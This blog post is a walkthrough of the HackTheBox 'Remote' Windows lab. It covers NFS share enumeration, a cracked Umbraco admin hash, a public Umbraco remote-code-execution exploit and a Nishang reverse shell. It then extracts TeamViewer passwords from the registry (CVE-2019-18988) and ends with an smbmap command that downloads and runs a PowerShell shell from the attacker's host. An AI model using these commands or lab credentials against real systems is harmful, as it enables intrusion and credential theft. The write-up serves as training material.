---
layout: single
title: "Remote Write-Up: HackTheBox"
excerpt: "Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had unexpected privilege escalation. An open NFS share allowed initial enumeration"
classes: wide
categories: [hackthebox]
date: 2020-09-05
tags: [hackthebox, hacking, penetration testing, write-ups, CVE, windows]
header:
  teaser: \assets\images\htb\remote\banner-remote.png
  teaser_home_page: true
toc: true
toc_label: "Table of Contents"
toc_icon: "book-dead"  # corresponding Font Awesome icon name (without fa prefix)
# toc_sticky: true
---
![](\assets\images\htb\remote\banner-remote.png)
## TL;DR
Remote was a Windows-based, easy level challenge from mrb3n on HackTheBox that had a cool privilege escalation. The initial Nmap scan showed multiple interesting ports - FTP with anonymous login, web server on port 80, SMB on 445 and a open NFS share. I started by connecting to FTP via the anonymous login, but it showed nothing interesting. Next, a quick enumeration of all available data on the http service led to an Umbraco login. I then connected the open NFS share on port 2049 and begun some real enumeration which allowed an extracted Administrator hash to the Umbraco application. Logging into Umbraco, I was able to exploit the application with a known CVE to obtain a shell as `iss apppool` and capture the User flag. After some system enumeration I discovered TeamViewer ver. 7.0.43148 installed which uses a shared AES key for all customer installations and published under CVE-2019-18988. This allowed a password to be decrypted that just so happened to a reused Administrator user password.

## Nmap Port Scan
`nmap -sCV -Pn -n -p- -T4 -oN nmap/full-remote 10.10.10.180`
```
Nmap scan report for 10.10.10.180         
Host is up (0.021s latency).              
Not shown: 65519 closed ports         
PORT      STATE SERVICE       VERSION 
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:                              
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 56s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-07T20:39:53
|_  start_date: N/A
```

## Web Enumeration

Initially looking at the web page we can see a link to Intranet. 
![](\assets\images\htb\remote\acme-page.png)

Following with clicking the Intranet link, we then see a link to Login which brings us to this Umbraco application. I attempted basic credentials and basic authentication assessment, but had no luck gaining access. 
![](\assets\images\htb\remote\umbraco-login.png)

## NFS Enumeration

The Network File System (NFS) is an interesting find in the port scan. Taking a closer look, we see a mountable share `site_backups`.
![](\assets\images\htb\remote\showmount.png)

`mount -t nfs 10.10.10.180:/site_backups nfs/`
![](\assets\images\htb\remote\site_backups.png)

After some enumeration, I located an interesting hash.
![](\assets\images\htb\remote\umbraco-sdf-hash.png)

Cracking the hash allows us to login to the Umbraco web application with Admin/Administrator.
`b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese`
![](\assets\images\htb\remote\umbraco-logged-in.png)

Umbraco version 7.12.4 was found in the "Help Area" which lines up with an exploit found in searchsploit.
![](\assets\images\htb\remote\searchsploit.png)

I used some GoogleFu and found another exploit PoC that I liked better here: https://github.com/noraj/Umbraco-RCE

![](\assets\images\htb\remote\poc-command-exec.png)

I served a modified Nishang Reverse-Tcp PowerShell script to return a shell:
https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
![](\assets\images\htb\remote\nishang-exec.png)

![](\assets\images\htb\remote\listener.png)

User.txt was found in C:\Users\Public
![](\assets\images\htb\remote\remote-user-flag.png)

Interesting, TeamViewer…
![](\assets\images\htb\remote\get-process-remote.png)

After a bit of enumeration and research into known Teamviewer vulnerabilities, I located a blog post which describes that the password can be extracted and has the potential to be reused as other users. Looked promising. I located the necessary hashes in the below registry entry.

```
PS C:\windows\system32\inetsrv> reg query HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY
[TRUNCATED OUTPUT]    
    LastMACUsed    REG_MULTI_SZ    \0005056B984A2
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x5e8d3439
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3
```
![](\assets\images\htb\remote\decryption.png)

[Decryption script and writeup.](https://whynotsecurity.com/blog/teamviewer/){:target="_blank"}

I reused my original Nishang shell script and SMBMap to escalate. 

```
smbmap -u administrator -p '!R3m0te!' -H 10.10.10.180 -x "powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.36/shell.ps1')"
```

Pop!
![](\assets\images\htb\remote\root.png)